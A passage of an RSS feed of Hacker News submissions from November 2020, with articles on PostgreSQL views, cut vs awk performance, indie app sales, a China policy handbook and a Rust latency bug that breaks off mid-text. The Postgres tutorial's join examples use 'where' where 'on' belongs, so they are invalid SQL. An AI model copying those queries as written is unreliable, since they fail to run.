				<p><img src="https://mk0themorningcocbq4h.kinstacdn.com/wp-content/themes/tmc/images/auth-abt-close.svg" alt=""></p><div>
				<p>
				<h3>sign up to read the whole article</h3>
				<h5>PLUS OTHER FREE STORIES ON THE MORNING CONTEXT</h5>
		<!-- / 		<div class="tmc-form-container">
		// 			<img src="https://mk0themorningcocbq4h.kinstacdn.com/images/auth-abt-close.svg" alt="" class="close-sign-up">
		// 			<div class="width-setter">
		// 				<div class="left-side-content">
		// 					<h3 class="form-title main-title"></h3>
		// 					<h5 class="form-subtitle"></h3>
		// 					
		// 							// 				</div>
		// 				<div class="right-side-img">
		// 					<img src="https://mk0themorningcocbq4h.kinstacdn.com/images/half-ellipse.svg" alt="">
		// 				</div>
		// 			</div>
		// 		</div>
	-->
	</p></div></div></article><!-- #post-83914 -->

		</main><!-- #main -->
	</div><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://themorningcontext.com/indias-whitehatjr-is-startup-hell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133421</guid>
            <pubDate>Wed, 18 Nov 2020 05:10:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[China vs. Democracy: The Greatest Game]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25133405">thread link</a>) | @michaelsbradley
<br/>
November 17, 2020 | https://halifaxtheforum.org/china-handbook/en/ | <a href="https://web.archive.org/web/*/https://halifaxtheforum.org/china-handbook/en/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

	<div id="content">





	<div id="fullwidth">
		<main id="main" role="main">

<article id="post-6532" class="page">
	<!-- .entry-header -->


<div>
<div>

<h3>A HANDBOOK FOR DEMOCRACIES</h3>

<p>Modern-day China has emerged as the most powerful authoritarian state in the history of the world.</p>
<p>The HFX Handbook for Democracies contributes to building a common understanding of the serious challenge that China poses.</p>
<p>The handbook features the <em><a href="https://hfxchinahandbook.s3.amazonaws.com/EN_HFX+China+Principles.pdf">HFX China Principles</a> </em>that defend the values that underpin democratic societies.</p>
<blockquote><p><strong><em>“THE REAL CHINA CHALLENGE FOR THE WORLD’S DEMOCRACIES IS HOW TO COOPERATE EFFECTIVELY WITH EACH OTHER.”</em></strong></p></blockquote>
<p><strong><a href="https://halifaxtheforum.org/china-handbook/cn/">点击这里查看中文</a> | <a href="https://halifaxtheforum.org/china-handbook/fr/">Cliquez ici pour le français</a></strong></p>
<h2>7/8 Campaign</h2>
<h3><b>Help HFX defend democratic values.</b></h3>
<p>Support the 7 HFX China Principles with a donation of $8 and together we will strengthen your government’s resolve to stand up to China.</p>
<p><a href="https://halifaxtheforum.org/china-handbook/donate-en">Donate $8</a></p>
</div>





</div></article></main></div>






	
	
	
					<!-- #main -->
	</div><!-- #primary -->
	
	


	</div></div>]]>
            </description>
            <link>https://halifaxtheforum.org/china-handbook/en/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133405</guid>
            <pubDate>Wed, 18 Nov 2020 05:04:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Basics of Views and Materialized Views in PostgreSQL]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25133370">thread link</a>) | @kiwicopple
<br/>
November 17, 2020 | https://supabase.io/blog/2020/11/18/postgresql-views | <a href="https://web.archive.org/web/*/https://supabase.io/blog/2020/11/18/postgresql-views">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>A quick summary of Postgres views, materialized views, and why you should use them.</p><h3>What is a View?</h3><p>A <a href="https://www.postgresql.org/docs/12/sql-createview.html" target="_blank" rel="noopener noreferrer">view</a> is a convenient shortcut to a query. Creating a view does not involve new tables or data. When run, an underlying query is executed, returning its results to the user.</p><h4>Basic Example</h4><p>Say we have the following tables from a database of a university:</p><p><strong>students</strong></p><table><thead><tr><th>id</th><th>name</th><th>type</th></tr></thead><tbody><tr><td>1</td><td>Arun</td><td>undergraduate</td></tr><tr><td>2</td><td>Zack</td><td>graduate</td></tr><tr><td>3</td><td>Joy</td><td>graduate</td></tr></tbody></table><p><strong>courses</strong></p><table><thead><tr><th>id</th><th>title</th><th>code</th></tr></thead><tbody><tr><td>1</td><td>Introduction to Postgres</td><td>PG101</td></tr><tr><td>2</td><td>Authentication Theories</td><td>AUTH205</td></tr><tr><td>3</td><td>Fundamentals of Supabase</td><td>SUP412</td></tr></tbody></table><p><strong>grades</strong></p><table><thead><tr><th>id</th><th>student_id</th><th>course_id</th><th>result</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>B+</td></tr><tr><td>2</td><td>1</td><td>3</td><td>A+</td></tr><tr><td>3</td><td>2</td><td>2</td><td>A</td></tr><tr><td>4</td><td>3</td><td>1</td><td>A-</td></tr><tr><td>5</td><td>3</td><td>2</td><td>A</td></tr><tr><td>6</td><td>3</td><td>3</td><td>B-</td></tr></tbody></table><p>Creating a view consisting of all the three tables will look like this:</p><div><div><div><div><p><span>create</span><span> </span><span>view</span><span> transcripts </span><span>as</span><span></span></p><p><span>    </span><span>select</span><span></span></p><p><span>        students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>        students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>        grades</span><span>.</span><span>result</span></p><p><span>    </span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>Once done, we can now access the underlying query with:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>For additional parameters or options, refer <a href="https://www.postgresql.org/docs/12/sql-createview.html#:~:text=parameters" target="_blank" rel="noopener noreferrer">here</a>.</p><h3>Why should we use Views?</h3><p>Views provide the several benefits:</p><ul><li>Simplicity</li><li>Consistency</li><li>Logical Organization</li><li>Security</li></ul><h4>Simplicity</h4><p>As a query becomes complex it becomes a hassle to call it. Especially when we run it at regularly. In the example above, instead of repeatedly running:</p><div><div><div><div><p><span>select</span><span></span></p><p><span>    students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>    students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>    grades</span><span>.</span><span>result</span></p><p><span></span><span>from</span><span> grades</span></p><p><span></span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span></span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>We can run this instead:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>Additionally, a view behaves like a typical table. We can safely use it in table <code>JOIN</code>s or even create new views using existing views.</p><h4>Consistency</h4><p>Views ensure that the likelihood of mistakes decreases when repeatedly executing a query. In our example above, we may decide that we want to exclude the course <em>Introduction to Postgres</em>. The query would become:</p><div><div><div><div><p><span>select</span><span></span></p><p><span>    students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>    students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>    courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>    grades</span><span>.</span><span>result</span></p><p><span></span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span></p><p><span></span><span>where</span><span> courses</span><span>.</span><span>code </span><span>!=</span><span> </span><span>'PG101'</span><span>;</span></p></div></div></div></div><p>Without a view, we would need to go into every dependent query to add the new rule. This would increase in the likelihood of errors and inconsistencies, as well as introducing a lot of effort for a developer. With views, we can alter just the underlying query in the view <strong>transcripts</strong>. The change will be applied to all applications using this view.</p><h4>Logical Organization</h4><p>With views, we can give our query a name. This is extremely useful for teams working with the same database. Instead of guessing what a query is supposed to do, a well-named view can easily explain it. For example, by looking at the name of the view <strong>transcripts</strong>, we can infer that the underlying query might involve the <strong>students</strong>, <strong>courses</strong>, and <strong>grades</strong> tables.</p><h4>Security</h4><p>Views can restrict the amount and type of data presented to a user. Instead of allowing a user direct access to a set of tables, we provide them a view instead. We can prevent them from reading sensitive columns by excluding them from the underlying query.</p><h3>What is a Materialized View?</h3><p>A <a href="https://www.postgresql.org/docs/12/rules-materializedviews.html" target="_blank" rel="noopener noreferrer">materialized view</a> is a form of view but with the added feature of physically storing the results. In subsequent reads of a materialized view, the time taken to return its results would be much faster than a conventional view. This is because the data is readily available for a materialized view while the conventional view executes the underlying query each time it is called.</p><h4>Basic Example</h4><p>Using our example above, a materialized view can be created like this:</p><div><div><div><div><p><span>create</span><span> materialized </span><span>view</span><span> transcripts </span><span>as</span><span></span></p><p><span>    </span><span>select</span><span></span></p><p><span>        students</span><span>.</span><span>name</span><span>,</span><span></span></p><p><span>        students</span><span>.</span><span>type</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>title</span><span>,</span><span></span></p><p><span>        courses</span><span>.</span><span>code</span><span>,</span><span></span></p><p><span>        grades</span><span>.</span><span>result</span></p><p><span>    </span><span>from</span><span> grades</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> students </span><span>where</span><span> grades</span><span>.</span><span>student_id </span><span>=</span><span> students</span><span>.</span><span>id</span></p><p><span>    </span><span>left</span><span> </span><span>join</span><span> courses </span><span>where</span><span> grades</span><span>.</span><span>course_id </span><span>=</span><span> courses</span><span>.</span><span>id</span><span>;</span></p></div></div></div></div><p>Reading from the materialized view is the same as a conventional view:</p><div><div><div><div><p><span>select</span><span> </span><span>*</span><span> </span><span>from</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>For additional parameters or options, refer <a href="https://www.postgresql.org/docs/12/sql-creatematerializedview.html#:~:text=parameters" target="_blank" rel="noopener noreferrer">here</a>.</p><h4>Refreshing</h4><p>Unfortunately, there is a trade-off - data in materialized views are not always up to date. We need to refresh it regularly to prevent the data from becoming too stale. To do so:</p><div><div><div><div><p><span>refresh materialized </span><span>view</span><span> transcripts</span><span>;</span></p></div></div></div></div><p>It's up to you how regularly refresh your materialized views, and it's probably different for each view depending on its use-case.</p><h3>Materialized views vs Conventional views</h3><p>Materialized views are useful when execution times for queries or views become unbearable or exceed the service level agreements of a business. These could likely occur in views or queries involving multiple tables and millions of rows. When using such a view, however, there should be tolerance towards data being outdated. Some use-cases for materialized views are internal dashboards and analytics.</p><p>Creating a materialized view is not a solution to inefficient queries. You should always seek to optimize a slow running query even if you are implementing a materialized view.</p><h3>Conclusion</h3><p>Postgres views and materialized views are a great way to organize and view results from commonly used queries. Although similar to one another, each has its purpose. Views simplify the process of running queries. Materialized views are usually faster at returning results, with the trade-off of having stale data.</p></section></div>]]>
            </description>
            <link>https://supabase.io/blog/2020/11/18/postgresql-views</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133370</guid>
            <pubDate>Wed, 18 Nov 2020 04:57:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cut vs. Awk]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25133319">thread link</a>) | @susam
<br/>
November 17, 2020 | https://www.datagubbe.se/cutvawk/ | <a href="https://web.archive.org/web/*/https://www.datagubbe.se/cutvawk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<br>
<h3>The UNIX philosophy</h3>

<p>
In UNIX, there is (or used to be) a philosophy which, among other things, 
stipulates that a piece of software should do "one thing well". There is 
of course a long-running debate over not only what this really means, 
but also about whether certain programs - if any at all - still adhere 
to this, or ever did.
</p>

<p>
So, we're allegedly in the middle of a dangerous downward spiral of 
constant feature creep and a growing number of command parameters that 
will, eventually, lead to a Grand Unified Program that does everything
poorly (Depending on your personal preference and current mood, replace
the GUP with systemd, Emacs, Windows or Google Chrome as you see fit).
</p>

<p>
I for one find the concept of the UNIX philosophy of doing one thing 
well amicable. I also realize that it is a product of a time when 
computers still mostly passed around text files, and that those text 
files were considered preposterously huge if they exceeded a couple of 
megs in size. Heck, the modern GUI was still a research project at PARC 
when Doug McIlroy wrote the UNIX philosophy down in 1976.
</p>

<h3>Thinkin' 'bout philosophy</h3>
<p>
So, what does it mean to do one thing and do it well? Well, awk has been
a staple of any UNIX diet since the late 1970s. I think it's a lovely
little tool which I use even for rather mundane tasks. It's certainly
changed a bit over the years, but the core concept of the language
remains the same. Still, it's a complete programming language and
can do a lot more than a simple, single-purpose command.
</p>

<p>
The cut command is slightly newer, but like awk, it's a part of the 
POSIX standard. It can also hardly be considered to have suffered much 
feature creep: it's got a rather stringent set of parameters and really 
does just one thing, which is cutting a smaller piece of text out of a 
larger piece of text.
</p>

<p>
The question is of course, does the UNIX philosophy still hold up? Is it always
better to have one small program doing one thing well, as opposed to a
slightly bigger program doing many things? Let's examine this by performing
a simple task with two slightly different twists.
</p>

<h3>Task number one</h3>

<p>
Task number one was to print the second column of a three-column file with
10,000 rows, with a single space separating the columns. This task was
repeated 100 times.
</p>

<p>
<b>cut (GNU coreutils, 43224 bytes)</b>
</p>
<pre>cat cva_in1 | cut -d ' ' -f 2 &gt; /dev/null

real    0m0.297s
user    0m0.288s
sys     0m0.153s
</pre>

<p>
<b>awk (gawk, 658072 bytes)</b>
</p>
<pre>cat cva_in1 | awk '{print $2}' &gt; /dev/null

real    0m0.818s
user    0m0.754s
sys     0m0.232s
</pre>

<p>
<b>Python 3 (Python 3.6, 4526456 bytes + libraries)</b>
<br>
My go-to language for farting around with programming ideas, thus
included for reference. The below two lines of code were written to
a script through which the input was piped and, just as above,
redirected to /dev/null:
</p>
<pre>import sys
for l in sys.stdin: print(l.split()[1])

real    0m5.423s
user    0m4.753s
sys     0m0.873s
</pre>

<p>
As is clearly evident from this highly scientific performance test,
cut is by far the fastest tool for the job. I tried a few different
approaches with Python (such as opening the file from the script
instead of piping it), but they were all similarly slow.
</p>

<h3>Task number two</h3>

<p>
This time, things were spiced up by printing the fifth column in a file 
with unevenly-spaced columns, using the output from "ls -l". The file 
used for testing contained 2235 lines. This task was also repeated 100 
times. Since cut doesn't quite cope with this uneven spacing, we had to 
put the magic of the UNIX philosophy to work using pipes: this time, tr 
was involved as well, stripping away spaces to make each row 
understandable to cut.
</p>

<p>
<b>cut + tr (GNU coreutils, 47288 bytes)</b>
</p>
<pre>cat cva_in2 | tr -s ' ' | cut -d ' ' -f 5 &gt; /dev/null

real    0m0.212s
user    0m0.371s
sys     0m0.138s
</pre>

<p>
<b>awk</b>
</p>
<pre>cat cva_in2 | awk '{print $5}' &gt; /dev/null

real    0m0.460s
user    0m0.379s
sys     0m0.225s
</pre>

<p>
<b>Python 3</b>
</p>

<pre>import sys
for l in sys.stdin: print(l.split()[4])

real    0m4.450s
user    0m3.693s
sys     0m0.934s
</pre>

<p>
Despite the extra pipe, it seems the UNIX philosophy comes out
on top this time as well.
</p>


<h3>A few notes</h3>
<p>
This is of course not an exhaustive test and proves little, if anything 
at all, about he UNIX philosophy. I just wanted to perform a simple test 
with a scenario that at least I have come across many different 
times in many different scripts and many different languages.
</p>

<p>
In a typical daily scenario, I would personally have picked awk for task 
two and saved myself a bit of typing and figuring. This would have made 
no significant impact on perceived performance, because I usually don't 
deal with very large files and in most cases, the time I spend with 
tools I'm less comfortable with far exceeds the time I then spend 
waiting for the script. Still: based on nothing but gut feeling, I 
actually expected awk to be faster or at least comparable for task two. 
So much for my gut.
</p>

<p>
For coping with more complex scenarios without resorting to a language 
proper, more pipes will have to be added and more command line utilities 
will have to be invoked if we want to keep on using tools compliant with 
the UNIX philosophy. This can likely lead to worse performance, but this 
test just goes to show (for the umpteenth time) that the tool we 
instinctively reach for to tackle a task might not be the right one.
</p>

</div></div>]]>
            </description>
            <link>https://www.datagubbe.se/cutvawk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133319</guid>
            <pubDate>Wed, 18 Nov 2020 04:49:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crossing $1k in quarterly app sales for the first time (2014-2020 story)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25133226">thread link</a>) | @frankbyte
<br/>
November 17, 2020 | https://blog.urtti.com/crossing-dollar1k-in-quarterly-app-sales-for-the-first-time-2014-2020-story | <a href="https://web.archive.org/web/*/https://blog.urtti.com/crossing-dollar1k-in-quarterly-app-sales-for-the-first-time-2014-2020-story">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605580648658/if0mVXSz_.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>This was a pretty cool milestone to bypass, and certainly with this year getting such a bad rap, at the very least it's proving to be a solid year in terms of side project software sales.</p>
<p>Why did it take so long, couple little nuggets here to chew on for fellow hashnoders.</p>
<h2 id="2014">2014</h2>
<p>Apple released Swift, thought it was cool and set out to build first apps. </p>
<p>I wanted to build games to build something fun so I created a couple different card games for the iPad and also a novel puzzler for iOS. </p>
<p>I had <strong>zero knowledge of marketing</strong>, didn't really think about <strong>WHY</strong> the large global markets would be interested in obscure Finnish card games and overall just did a real rookie job.</p>
<p>I was a decent coder, but I think that's pretty much where it started and ended.</p>
<h2 id="2015-2016">2015-2016</h2>
<p>Not too much activity, kept tinkering with a number of projects but didn't release new significant stuff. </p>
<p>Didn't count the non-published projects that were taken quite far but I'm sure there was many. </p>
<p>What can be learned here? <strong>You can't win if you don't play the game.</strong></p>
<h2 id="2017-2018">2017-2018</h2>
<p>This was the first time I started to see more traction. There were two reasons why this happened.</p>
<ol>
<li><p>I created a couple of games that already had audience (Klondike, Spider and Freecell Solitaire). Games that many people love and will always look to find for their new HW. <strong>In short, launching something with a pre-existing demand</strong>.</p>
</li>
<li><p>I started primarily focusing on the MacOS market. The iOS simple games market is incredible competitive. There are big studios there that pour in big bucks to make really refined experiences and make the games freemium. It's really hard in that environment to be discovered or sell your games for a few bucks. But in the Mac App Store this was possible. In other words, <strong>finding a market with less competition and easier discoverability</strong>.</p>
</li>
</ol>
<p>Still didn't really spend that much time on indie hacking, community building, marketing in general or much else. Just built a few games, put 'em out there and tried to make sure most gamers would be happy with them.</p>
<h2 id="2019">2019</h2>
<p>Quite suddenly and unexpectedly my sales made a huge jump in Q4 2019. Without releasing anything new. What happened? </p>
<p>Apple released macOS Catalina that would not run 32-bit apps anymore. </p>
<p>This meant that <strong>they erased much of the competition</strong> for the card games and all of a sudden more people were looking for these games and had less options to choose from. One would rather excel due to their own great products, but everything counts, right?</p>
<p>At the same time I also knew that I really had to create more something totally different, was simply not interested to put too much effort into this genre anymore.</p>
<h2 id="2020">2020</h2>
<p>The year obviously went haywire from the start and under quarantine I had a chance to finalise and release an app into a totally new genre - productivity. </p>
<p>I created a pretty simple Mac utility  <a target="_blank" href="https://owlocr.com/">OwlOCR</a> and for the first time tried to release in a more sensible way. I published some posts in r/macapps and got phenomenal feedback that really helped improve the app. Super thankful to these early users.</p>
<p>I then launched PH and got a lot of downloads, but less direct feedback. At this point app was still free as I wanted to get some footprint first. </p>
<p>After a few months of totally free, I introduced a premium in-app tier to help with further development. Sales of this tier have been pretty steady and there hasn't been too much negative backlash, as I've kept most features free for all.</p>
<p>This was the first app where I put more effort into the webpage and release efforts, I think next ones should easier as I know a bit more again how to play it.</p>
<p>There's still waaaaayyyyy long way to go before this could be primary source of bread and butter, but the last year has given at least kind of a glimpse of that. </p>
<p>I'm afraid I might need to pivot away from the Mac App Store however, as it opens to iOS apps in the future. At that point I'm afraid it will become as convoluted with big player apps that the indies will be pushed to the sidelines.</p>
<p><em>Article first written and published in Indiehackers on October 4th 2020. Also image from that release. Updates to follow after 2020 ends.</em></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.urtti.com/crossing-dollar1k-in-quarterly-app-sales-for-the-first-time-2014-2020-story</link>
            <guid isPermaLink="false">hacker-news-small-sites-25133226</guid>
            <pubDate>Wed, 18 Nov 2020 04:29:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[40 millisecond bug]]>
            </title>
            <description>
<![CDATA[
Score 118 | Comments 25 (<a href="https://news.ycombinator.com/item?id=25133127">thread link</a>) | @sshroot
<br/>
November 17, 2020 | https://vorner.github.io/2020/11/06/40-ms-bug.html | <a href="https://web.archive.org/web/*/https://vorner.github.io/2020/11/06/40-ms-bug.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
      <section id="main_content">
        

<p>This is a small story about tracking down a production bug in a Rust
application. I don’t know if there’s any take away from this one for the reader,
but it felt interesting so I’m sharing it.</p>

<h2 id="a-bit-of-backstory">A bit of backstory</h2>

<p>In Avast, we have a Rust application called <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It serves as a backend to
some other applications, provides them a HTTP API. It’s in Rust because it is
latency critical. Latencies of most requests are under a millisecond.</p>

<p>It was written with <a href="https://docs.rs/tokio/0.1.*"><code>tokio-0.1</code></a> and <a href="https://docs.rs/hyper/0.12.*"><code>hyper-0.12</code></a> to deal with the HTTP. We
were quite late to update to newer versions, in part because it worked fine and
the amount of <code>async</code> code was single quite short function, so we didn’t have
much motivation. And in part because we use the <a href="https://crates.io/crates/spirit"><code>spirit</code></a> libraries for
configuration. It’s a library to take configuration and set up the internal
state of the program for it ‒ configuration contains the ports to listen to,
etc, and it manages spawning the HTTP server objects inside the program and can
even migrate from one set of ports to other at runtime.</p>

<p>But migrating <a href="https://crates.io/crates/spirit"><code>spirit</code></a> to newer <code>tokio</code> and <code>hyper</code> was a big task (because
the API surface is quite large, the library does a bit unusual things compared
to all the usual applications and the change between old and new <code>tokio</code> was
quite large).</p>

<p>Anyway, eventually I got permission to work on the migration of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> as
part of my job. It took about a week to migrate both <a href="https://crates.io/crates/spirit"><code>spirit</code></a> and <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It
went through review, went through the automatic tests and we put it to the
staging environment for a while, watching the logs and graphs. Everything seemed
fine, so after few days of everything looking fine, we pushed the button and put
it to production.</p>

<h2 id="the-increased-latencies">The increased latencies</h2>

<p>As it goes in these kinds of stories, by now you’re expecting to see what went
wrong.</p>

<p>The thing is, our own metrics and graphs were fine. But the latency on the
downstream service querying us increased by 40ms. The deployment got reverted,
and we started to dig into where these latencies come from.</p>

<h2 id="it-was-acting-really-weird">It was acting really weird</h2>

<p>There were several very suspicious things about that.</p>

<ul>
  <li>Our own „internal“ latencies stayed the same. Our CPU usage also stayed the
same.</li>
  <li>The latency graph on the downstream side was flat 40ms <em>constant</em>.</li>
</ul>

<p>Now, if we introduced some performance regression in the query handling, we
would expect our CPU consumption to rise. We would also expect the latency graph
to be a bit spiky, not completely flat 40ms constant. It almost looked like
there was a 40ms <code>sleep</code> somewhere. But why would anyone put a 40ms sleep
anywhere?</p>

<p>I’ve looked through documentation and didn’t see anything obvious. I’ve tried
searching both our code and code of the dependencies for <code>40</code>, asked on Slack if
that <code>40ms</code> value was familiar to anyone. Nothing.</p>

<p>The working theory we started with was that there could be some kind of back-off
sleep on some kind of failure. Maybe <code>hyper</code> would be closing inactive
connections in the new version, forcing the application to reconnect (the graph
was for 99th percentile, so if we happened to close each 100th connection and
reconnection took this long…) and maybe try IPv6 first and we would be listening
on IPv4 only or… (in other words, we didn’t have a clear clue).</p>

<h2 id="the-benchmarks">The benchmarks</h2>

<p>My colleague started to investigate in a more thorough way than just throwing
ideas around on Slack. He run a <code>wrk</code> benchmark against the service. On his
machine, the latencies were fine. So he commandeered one of the stage nodes to
play with it and run the benchmark there. And every request had 40ms latency on
that machine. The previous version of <code>urlite</code> was fine, with under one
millisecond.</p>

<p><em>Something</em> was probably sleeping somewhere on the production servers, but not
on the development machine. There probably was some difference in the OS
settings, but definitely difference in the kernel version. The servers are
running some well-tried Linux distribution, so they have a lot older version,
while a developer is likely to run something much more on the edge.</p>

<h2 id="configuration-options">Configuration options</h2>

<p>The selling point of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> is that most of the thing one can set in the
builders of various libraries and types now can be just put into a config file
without any recompilation. If we did configuration by hand, we would expose only
the things we thought would be useful, but with spirit, there’s everything. So,
naturally, tweaking some of the config knobs was the next step (because it was
easy to do).</p>

<p>It was discovered that turning the <code>http1-writev</code> option <em>off</em>, which
corresponds to
<a href="https://docs.rs/hyper/0.13.8/hyper/server/struct.Builder.html#method.http1_writev">this method</a>
in <code>hyper</code>, made the latencies go away.</p>

<p>We now had a solution, but I wasn’t happy about not understanding <em>why</em> that
helped, so I went to dig the rabbit hole and find the root cause. Turns out
there were several little things in just the constellation to make the problem
manifest.</p>

<h2 id="overriding-the-defaults-of-http1_writev">Overriding the defaults of <code>http1_writev</code></h2>

<p>The method controls the strategy in which way data are pushed into the socket.
With vectored writes enabled, it sends two separate buffers (one with headers,
the other with the body if it’s small enough) through a single <a href="https://linux.die.net/man/2/writev"><code>writev</code></a>
syscall.  If they are disabled, <code>hyper</code> copies all the bytes into a single
buffer and sends that as a whole.</p>

<p>It turns out that the method takes a <code>bool</code>, but there are actually 3 states.
The third (auto) is signalled by <em>not</em> calling the method and <code>spirit-hyper</code> was
calling it always, with the default to turn the <a href="https://linux.die.net/man/2/writev"><code>writev</code></a> on. I don’t know if
leaving it on auto would make the bug go away, but I’ve fixed the problem in the
library anyway.</p>

<h2 id="splitting-vectored-writes">Splitting vectored writes</h2>

<p>Spirit wants to support a bit of configuration on top of what the underlying
libraries provide on their own. One of such things is limiting the number of
concurrently accepted connections on a single listening socket. Users don’t have
to take advantage of that (the types for the configuration can be composed
together to either contain that bit or not and the administrator may leave the
values for the limits unset in the configuration and then they won’t be
enforced).</p>

<p>Anyway, in case the support for the limits is opted in through using the type
with the configuration fields, the connections themselves are wrapped in a
<a href="https://docs.rs/spirit-tokio/0.7.*/spirit_tokio/net/limits/struct.Tracked.html"><code>Tracked</code></a>
type. The type tries to be mostly transparent for use and can be used inside
<code>hyper</code> (which is what the default configuration type alias in <code>spirit-hyper</code>
does), but tracks how many connections there are, to not accept more if it runs
out of the limit.</p>

<p>When implementing the bunch of traits for the wrapper, I’ve overlooked the
<a href="https://docs.rs/tokio/0.2.*/tokio/io/trait.AsyncWrite.html#method.poll_write_buf"><code>AsyncWrite::poll_write_buff</code></a>.
It is a provided method, which means it has a default implementation. It is the
one that abstracts the OS-level <code>writev</code>, it can write multiple buffers (the
<a href="https://docs.rs/bytes/0.5.*/bytes/buf/trait.Buf.html"><code>Buf</code></a> represents a
segmented buffer).</p>

<p>The default implementation simply delegates to multiple calls to the ordinary
write. Therefore, this omission combined with the default of enabling vectored
writes results in calling into the kernel twice, each time with a small buffer,
instead of once with two small buffers or once with a big buffer.</p>

<p>That was definitely something to get fixed, because if nothing else, syscalls
are expensive and calling more of them is not great. But I’ve finally felt like
I’m on the right path, because:</p>

<h2 id="nagles-algorithm">Nagle’s algorithm</h2>

<p>You probably know that TCP stream is built from packets going there and back.
Optimizing how to split the stream into the packets and when to send them is a
hard problem and the research in that area is still ongoing, because there are
many conflicting requirements. One wants to deliver the data with low latency,
utilize the whole bandwidth, but not overflow the capacity of the link (in which
case the latencies would go up or packets would get lost and would have to be
retransmitted), leave some bandwidth to other connections, etc.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Nagle%27s_algorithm">Nagle’s algorithm</a> is
one of the older tricks up in TCP’s sleeve. The network doesn’t like small
packets.  It is better to send as large packets as the link allows, because each
packet has certain overhead ‒ the headers that take some space, but also routers
spend computation power mostly based on number of packets and less on their
size. If you start sending a lot of tiny packets, the performance will suffer.
While the links are limited by the number of bytes that can pass through them,
routers are more limited by the number of packets. If a router declares to be
able to handle a gigabit connection, it actually means a gigabit <em>if you use
full-sized packets</em>, but will get to few megabits if you split the data into
tiny packets.</p>

<p>So it would be better to wait until the send buffer contains a packetfull of
data before sending anything. But we can’t do that, because we don’t <em>know</em>
there’ll ever be a full packet of data, or generating more data might wait for
the other side to answer. We would never send anything and wait forever and the
Internet would not work.</p>

<p>Instead, the algorithm is willing to send <em>one</em> undersized packet and then it
waits for an <code>ACK</code> from the other side until sending another undersized one. If
it gets a packetfull of data to send in the meantime, that’s great and it sends
it (it won’t get better by waiting longer), but it won’t ever have two
undersized ones somewhere in flight, therefore won’t kill the network’s
performance by them.</p>

<p>This works, it’ll make progress eventually because once the <code>ACK</code> comes and
all the data that accumulated until then is sent.</p>

<p>But it also slows things down. Like in our case. What happens if we do it using
single syscall, the whole HTTP response forms a single undersized packet (we
